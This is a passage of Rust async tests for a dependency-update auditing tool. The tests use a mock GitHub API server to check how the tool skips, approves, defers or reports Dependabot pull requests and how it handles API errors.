        match outcome {
            AuditOutcome::Reported(findings) => {
                // Exactly one finding: the deferred-list summary.
                assert_eq!(findings.len(), 1, "got: {findings:?}");
                let f = &findings[0];
                assert!(
                    f.subject.contains("deferred") && f.subject.contains("cap"),
                    "deferred finding subject: {}",
                    f.subject
                );
                assert!(f.body.contains("#3"));
            }
            other => panic!("expected Reported, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_skips_already_approved_prs() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body(
                r#"[{"number":42,"html_url":"u/42","title":"bump","user":{"login":"dependabot[bot]"}}]"#,
            )
            .create_async()
            .await;
        // Already approved by some user → skip.
        server
            .mock("GET", "/repos/forky/repo/pulls/42/reviews")
            .with_status(200)
            .with_body(
                r#"[{"state":"APPROVED","user":{"login":"some-reviewer"}}]"#,
            )
            .create_async()
            .await;
        // Diff fetch and approve must NOT be called.
        let no_diff = server
            .mock("GET", "/repos/forky/repo/pulls/42")
            .expect(0)
            .create_async()
            .await;
        let no_approve = server
            .mock("POST", "/repos/forky/repo/pulls/42/reviews")
            .expect(0)
            .create_async()
            .await;

        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 5);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let outcome = audit.run(&mut ctx).await.expect("run succeeds");

        no_diff.assert_async().await;
        no_approve.assert_async().await;
        match outcome {
            AuditOutcome::Reported(findings) => assert!(findings.is_empty(), "got: {findings:?}"),
            other => panic!("expected Reported, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_reports_unsafe_prs_via_findings() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body(
                r#"[{"number":7,"html_url":"u/7","title":"bump+drift","user":{"login":"dependabot[bot]"}}]"#,
            )
            .create_async()
            .await;
        server
            .mock("GET", "/repos/forky/repo/pulls/7/reviews")
            .with_status(200)
            .with_body("[]")
            .create_async()
            .await;
        server
            .mock("GET", "/repos/forky/repo/pulls/7")
            .with_status(200)
            .with_body(UNSAFE_DIFF_NON_MANIFEST)
            .create_async()
            .await;
        let no_approve = server
            .mock("POST", "/repos/forky/repo/pulls/7/reviews")
            .expect(0)
            .create_async()
            .await;

        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 5);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let outcome = audit.run(&mut ctx).await.expect("run succeeds");

        no_approve.assert_async().await;
        match outcome {
            AuditOutcome::Reported(findings) => {
                assert_eq!(findings.len(), 1);
                let f = &findings[0];
                assert_eq!(f.severity, Severity::Low);
                assert!(
                    f.subject.contains("PR #7") && f.subject.contains("non-manifest"),
                    "got: {}",
                    f.subject
                );
                assert!(f.body.contains("src/lib.rs"), "body: {}", f.body);
            }
            other => panic!("expected Reported, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_reports_deferred_safe_prs_when_cap_hit() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        // 2 PRs, cap = 1.
        server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body(
                r#"[
                  {"number":1,"html_url":"u/1","title":"a","user":{"login":"dependabot[bot]"}},
                  {"number":2,"html_url":"u/2","title":"b","user":{"login":"dependabot[bot]"}}
                ]"#,
            )
            .create_async()
            .await;
        for n in 1..=2 {
            server
                .mock(
                    "GET",
                    format!("/repos/forky/repo/pulls/{n}/reviews").as_str(),
                )
                .with_status(200)
                .with_body("[]")
                .create_async()
                .await;
            server
                .mock(
                    "GET",
                    format!("/repos/forky/repo/pulls/{n}").as_str(),
                )
                .with_status(200)
                .with_body(SAFE_DIFF)
                .create_async()
                .await;
        }
        let approve_1 = server
            .mock("POST", "/repos/forky/repo/pulls/1/reviews")
            .with_status(200)
            .with_body("{}")
            .expect(1)
            .create_async()
            .await;
        let no_approve_2 = server
            .mock("POST", "/repos/forky/repo/pulls/2/reviews")
            .expect(0)
            .create_async()
            .await;

        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 1);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let outcome = audit.run(&mut ctx).await.expect("run succeeds");

        approve_1.assert_async().await;
        no_approve_2.assert_async().await;
        match outcome {
            AuditOutcome::Reported(findings) => {
                assert_eq!(findings.len(), 1);
                assert!(findings[0].subject.contains("deferred"), "got: {}", findings[0].subject);
                assert!(findings[0].body.contains("#2"));
            }
            other => panic!("expected Reported, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_handles_list_api_failure_returning_err() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(503)
            .with_body(r#"{"message":"service unavailable"}"#)
            .create_async()
            .await;
        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 5);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let err = audit
            .run(&mut ctx)
            .await
            .expect_err("list-PRs failure must surface as Err");
        let msg = format!("{err:#}");
        assert!(msg.contains("503"), "error must include status: {msg}");
    }

    #[tokio::test]
    async fn run_continues_when_individual_diff_fetch_fails() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body(
                r#"[
                  {"number":1,"html_url":"u/1","title":"a","user":{"login":"dependabot[bot]"}},
                  {"number":2,"html_url":"u/2","title":"b","user":{"login":"dependabot[bot]"}}
                ]"#,
            )
            .create_async()
            .await;
        for n in 1..=2 {
            server
                .mock(
                    "GET",
                    format!("/repos/forky/repo/pulls/{n}/reviews").as_str(),
                )
                .with_status(200)
                .with_body("[]")
                .create_async()
                .await;
        }
        // PR 1: diff fetch fails. PR 2: diff fetch succeeds with safe diff.
        server
            .mock("GET", "/repos/forky/repo/pulls/1")
            .with_status(500)
            .with_body(r#"{"message":"boom"}"#)
            .create_async()
            .await;
        server
            .mock("GET", "/repos/forky/repo/pulls/2")
            .with_status(200)
            .with_body(SAFE_DIFF)
            .create_async()
            .await;
        // PR 1 must NOT have an approve; PR 2 must.
        let no_approve_1 = server
            .mock("POST", "/repos/forky/repo/pulls/1/reviews")
            .expect(0)
            .create_async()
            .await;
        let approve_2 = server
            .mock("POST", "/repos/forky/repo/pulls/2/reviews")
            .with_status(200)
            .with_body("{}")
            .expect(1)
            .create_async()
            .await;

        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 5);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let outcome = audit
            .run(&mut ctx)
            .await
            .expect("audit must return Ok despite individual diff fetch failure");

        no_approve_1.assert_async().await;
        approve_2.assert_async().await;
        match outcome {
            AuditOutcome::Reported(findings) => {
                // Exactly one finding for PR 1's diff fetch failure.
                assert_eq!(findings.len(), 1, "got: {findings:?}");
                assert!(
                    findings[0].subject.contains("PR #1") && findings[0].subject.contains("diff fetch failed"),
                    "got: {}",
                    findings[0].subject
                );
                assert_eq!(findings[0].severity, Severity::Low);
            }
            other => panic!("expected Reported, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_uses_upstream_when_fork_owner_unset() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;
        // No fork_owner → target is the upstream repo (upstream-org).
        let list = server
            .mock("GET", "/repos/upstream-org/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body("[]")
            .expect(1)
            .create_async()
            .await;
        let ws_dir = TempDir::new().unwrap();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), None, 5);
        let mut ctx = make_ctx(ws_dir.path(), &repo);
        let outcome = audit.run(&mut ctx).await.expect("run succeeds");
        list.assert_async().await;
        match outcome {
            AuditOutcome::Reported(findings) => assert!(findings.is_empty()),
            other => panic!("expected Reported, got {other:?}"),
        }
    }
}
